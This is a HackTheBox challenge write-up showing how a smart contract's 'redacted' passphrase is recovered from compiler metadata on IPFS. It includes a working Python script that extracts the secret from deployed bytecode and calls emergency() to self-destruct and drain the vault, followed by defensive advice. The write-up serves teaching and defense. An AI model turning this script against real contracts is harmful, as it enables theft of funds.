---
layout: post
title: "HackTheBox Challenge: MetaVault"
date: 2027-10-22 09:00:00 -0500
categories: [HackTheBox, Challenges, Blockchain]
tags: [hackthebox, challenge, blockchain, solidity, smart-contract, metadata, ipfs, selfdestruct, cwe-615]
---

MetaVault is an Easy blockchain challenge built around a smart contract that guards the country's ETH reserves behind a secret passphrase. The contract only stores the *hash* of the passphrase, and the plaintext was "redacted" from the open-sourced code before release. The catch: the developers left the secret in a Solidity doc-comment and compiled the contract with metadata enabled — so the supposedly-stripped passphrase is still sitting in the contract's metadata, published to IPFS for anyone to read. Recover it, and a single transaction self-destructs the vault and drains it. This is [CWE-615](https://cwe.mitre.org/data/definitions/615.html), inclusion of sensitive information in source-code comments, with a smart-contract twist.

## Overview

The goal is to empty the vault — `Setup.isSolved()` returns true when `address(TARGET).balance == 0`:

```solidity
function isSolved() public view returns (bool) {
    return address(TARGET).balance == 0;
}
```

The only function that moves funds is an emergency self-destruct, gated on a secret:

```solidity
bytes32 constant private VAULT_SECRET_K256 = 0x42c10591...ca826b5e;

function emergency(string memory _secret) external {
    if (keccak256(bytes(_secret)) == VAULT_SECRET_K256) {
        selfdestruct(payable(msg.sender));   // sends ALL ETH to the caller
    } else {
        emit FailedLoginAttempt(msg.sender, _secret, keccak256(bytes(_secret)));
    }
}
```

We have the hash but not the preimage, and the source comment that held it was wiped:

```solidity
/**
 * @dev plaintext secret: [REDACTED]
 * @dev The secret will be stripped before open sourcing the code. Comments are not compiled anyway.
 */
```

## The technique

The developer's assumption — *"comments are not compiled anyway"* — is true for the **runtime bytecode**, but not for the compiler **metadata**. With metadata enabled (the Solidity default), the compiler does two things that defeat the redaction:

1. It builds a metadata JSON that embeds the full **natspec documentation** — every `@title`, `@author`, `@dev`, `@param` — under `output.devdoc`.
2. It pins that JSON to **IPFS** and appends the resulting CID to the deployed bytecode as a trailing **CBOR** structure: `{ipfs: <multihash>, solc: <version>}`. The final two bytes of the bytecode are that CBOR blob's length.

The `@dev plaintext secret: ...` comment existed at compile time, so it is permanently baked into the published metadata. Deleting it from the open-sourced `.sol` afterwards changes nothing — anyone holding the deployed bytecode can walk the trailing CBOR to the IPFS CID and read the doc-comment straight back out.

## Solution

The HTB instance exposes three ports: a JSON-RPC endpoint (`eth_chainId` → `0x7a69` = 31337), a TCP handler menu (option `1` prints the player key + target/setup addresses, option `3` returns the flag once solved), and a web frontend that even hints *"compiled with metadata enabled and published on IPFS."* Grab the connection info from the handler, then run the solve:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, subprocess, json, urllib.request, cbor2, base58

RPC, TARGET, PK = sys.argv[1], sys.argv[2], sys.argv[3]

def cast(*a):
    return subprocess.check_output(["cast", *a]).decode().strip()

# 1) deployed bytecode -> trailing CBOR metadata -> IPFS multihash -> CIDv0
code = cast("code", TARGET, "--rpc-url", RPC)
b = bytes.fromhex(code[2:] if code.startswith("0x") else code)
clen = int.from_bytes(b[-2:], "big")          # last 2 bytes = CBOR length
meta = cbor2.loads(b[-(clen + 2):-2])
cid = base58.b58encode(meta["ipfs"]).decode() # Qm... (CIDv0)
print("[+] IPFS CID:", cid)

# 2) fetch compiler metadata from a public gateway -> devdoc -> secret
md = None
for gw in ("https://gateway.pinata.cloud/ipfs/", "https://dweb.link/ipfs/"):
    try:
        md = json.loads(urllib.request.urlopen(gw + cid, timeout=15).read()); break
    except Exception:
        continue
details = md["output"]["devdoc"]["stateVariables"]["VAULT_SECRET_K256"]["details"]
secret = details.split("plaintext secret:")[1].strip().split()[0]
print("[+] recovered secret:", secret)
assert cast("keccak", secret).lower().startswith("0x42c10591")

# 3) emergency(secret) -> selfdestruct drains the vault, balance == 0
cast("send", TARGET, "emergency(string)", secret, "--rpc-url", RPC, "--private-key", PK)
print("[+] vault drained — read the flag from the handler (option 3)")
```

Run it against the live instance:

```bash
pip install cbor2 base58
python3 solve.py http://<rpc-host>:<rpc-port> <target-addr> <private-key>
```

The `@dev` doc-comment comes straight back from IPFS:

```json
"VAULT_SECRET_K256": { "details": "plaintext secret: <recovered-passphrase> ..." }
```

`keccak256` of that string equals the hardcoded `VAULT_SECRET_K256`, so `emergency()` self-destructs the contract, transfers all 100 ETH to us, and `isSolved()` flips true. The flag (`HTB{...}`, redacted here) is then read live from the handler's "Get flag" option.

## Why it worked

The security boundary was "only someone who knows the passphrase can drain the vault," enforced by comparing `keccak256(input)` against a stored hash. That is sound only if the preimage never appears anywhere reachable. By writing the secret into a source comment and compiling with metadata on, the team published the preimage to a public, content-addressed store (IPFS) and stamped its address into the very bytecode everyone can read. The hash check became decorative.

## Fix / defense

- **Never put secrets, keys, or passphrases in source or comments** — they survive in compiled metadata even after you strip them from the published source.
- Don't gate security on a `keccak256(secret)` preimage that has to exist off-chain. Use **commit–reveal** or an **off-chain signature** verified with `ecrecover` against a trusted signer — there is no recoverable secret in the artifact.
- For sensitive contracts, disable metadata publishing or set `settings.metadata.bytecodeHash = "none"`, and don't pin metadata to IPFS.
- Treat the deployed bytecode **and** its IPFS metadata as fully public; assume every embedded byte is readable by anyone.
